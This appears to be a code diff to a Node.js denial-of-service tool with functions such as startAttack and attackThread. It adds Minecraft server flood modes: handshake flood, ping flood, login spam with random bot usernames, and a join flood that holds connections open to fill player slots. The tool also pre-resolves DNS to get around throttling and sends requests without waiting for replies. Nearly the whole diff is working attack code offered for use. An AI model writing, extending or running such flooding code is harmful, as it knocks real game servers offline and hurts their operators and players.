@@ -2,6 +2,7 @@ const WebSocket = require('ws');
 const https = require('https');
 const http = require('http');
 const dns = require('dns').promises;
+const net = require('net');
 
 // IMPORTANT: Use wss:// for secure WebSocket (Render uses HTTPS)
 // Change this to your Render URL
@@ -162,12 +163,15 @@ async function startAttack(config) {
 }
 
 async function attackThread(config, endTime) {
+  // Check if this is a Minecraft attack
+  const isMinecraft = config.attackMode && config.attackMode.startsWith('minecraft-');
+  
   // Pre-resolve DNS to bypass DNS throttling
   let resolvedIP = null;
-  if (config.bypassDNS) {
+  if (config.bypassDNS || isMinecraft) {
     try {
-      const url = new URL(config.target);
-      resolvedIP = await resolveDNS(url.hostname);
+      const target = isMinecraft ? config.target : new URL(config.target).hostname;
+      resolvedIP = await resolveDNS(target);
     } catch (e) {
       log('⚠ DNS resolution failed, using hostname');
     }
@@ -175,7 +179,11 @@ async function attackThread(config, endTime) {
   
   // Don't wait for responses - fire and forget for max speed
   while (isRunning && Date.now() < endTime) {
-    sendRequestNoWait(config, resolvedIP);
+    if (isMinecraft) {
+      sendMinecraftAttack(config, resolvedIP);
+    } else {
+      sendRequestNoWait(config, resolvedIP);
+    }
     stats.sent++;
     
     if (config.delay > 0) {
@@ -486,6 +494,126 @@ function updateDisplay() {
 function log(message) {
   const time = new Date().toLocaleTimeString();
   console.log(`\n[${time}] ${message}`);
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// Minecraft Protocol Functions
+function writeVarInt(value) {
+  const bytes = [];
+  while (true) {
+    if ((value & ~0x7F) === 0) {
+      bytes.push(value);
+      break;
+    }
+    bytes.push((value & 0x7F) | 0x80);
+    value >>>= 7;
+  }
+  return Buffer.from(bytes);
+}
+
+function writeString(str) {
+  const strBuf = Buffer.from(str, 'utf8');
+  const lenBuf = writeVarInt(strBuf.length);
+  return Buffer.concat([lenBuf, strBuf]);
+}
+
+function createHandshakePacket(host, port) {
+  const packetId = Buffer.from([0x00]); // Handshake packet ID
+  const protocolVersion = writeVarInt(754); // 1.16.5
+  const serverAddress = writeString(host);
+  const serverPort = Buffer.allocUnsafe(2);
+  serverPort.writeUInt16BE(port, 0);
+  const nextState = writeVarInt(1); // Status request
+  
+  const data = Buffer.concat([packetId, protocolVersion, serverAddress, serverPort, nextState]);
+  const length = writeVarInt(data.length);
+  
+  return Buffer.concat([length, data]);
+}
+
+function createStatusRequestPacket() {
+  const packetId = Buffer.from([0x00]); // Status request
+  const length = writeVarInt(1);
+  return Buffer.concat([length, packetId]);
+}
+
+function createLoginStartPacket(username) {
+  const packetId = Buffer.from([0x00]); // Login start
+  const playerName = writeString(username);
+  const data = Buffer.concat([packetId, playerName]);
+  const length = writeVarInt(data.length);
+  return Buffer.concat([length, data]);
+}
+
+function sendMinecraftAttack(config, resolvedIP) {
+  const mode = config.attackMode;
+  const target = resolvedIP || config.target;
+  const port = config.minecraftPort || 25565;
+  
+  try {
+    const socket = new net.Socket();
+    socket.setTimeout(5000);
+    
+    socket.connect(port, target, () => {
+      switch(mode) {
+        case 'minecraft-handshake':
+          // Handshake flood - sends initial connection packets
+          const handshake = createHandshakePacket(config.target, port);
+          socket.write(handshake);
+          socket.destroy();
+          stats.success++;
+          break;
+          
+        case 'minecraft-ping':
+          // Ping flood - requests server status
+          const handshakeForPing = createHandshakePacket(config.target, port);
+          const statusRequest = createStatusRequestPacket();
+          socket.write(Buffer.concat([handshakeForPing, statusRequest]));
+          socket.destroy();
+          stats.success++;
+          break;
+          
+        case 'minecraft-login':
+          // Login spam - attempts login with random usernames
+          const randomUser = 'Bot_' + Math.random().toString(36).substring(7);
+          const handshakeForLogin = createHandshakePacket(config.target, port);
+          handshakeForLogin[handshakeForLogin.length - 1] = 0x02; // Change to login state
+          const loginStart = createLoginStartPacket(randomUser);
+          socket.write(Buffer.concat([handshakeForLogin, loginStart]));
+          // Keep connection open to consume server resources
+          setTimeout(() => socket.destroy(), 10000);
+          stats.success++;
+          break;
+          
+        case 'minecraft-join':
+          // Join flood - full connection attempt
+          const joinUser = 'Player_' + Math.random().toString(36).substring(7);
+          const handshakeForJoin = createHandshakePacket(config.target, port);
+          handshakeForJoin[handshakeForJoin.length - 1] = 0x02;
+          const loginPacket = createLoginStartPacket(joinUser);
+          socket.write(Buffer.concat([handshakeForJoin, loginPacket]));
+          // Don't destroy - keep connection to fill slots
+          stats.success++;
+          break;
+      }
+    });
+    
+    socket.on('error', () => {
+      stats.failed++;
+      socket.destroy();
+    });
+    
+    socket.on('timeout', () => {
+      stats.failed++;
+      socket.destroy();
+    });
+    
+  } catch (error) {
+    stats.failed++;
+  }
 }
 
 function sleep(ms) {
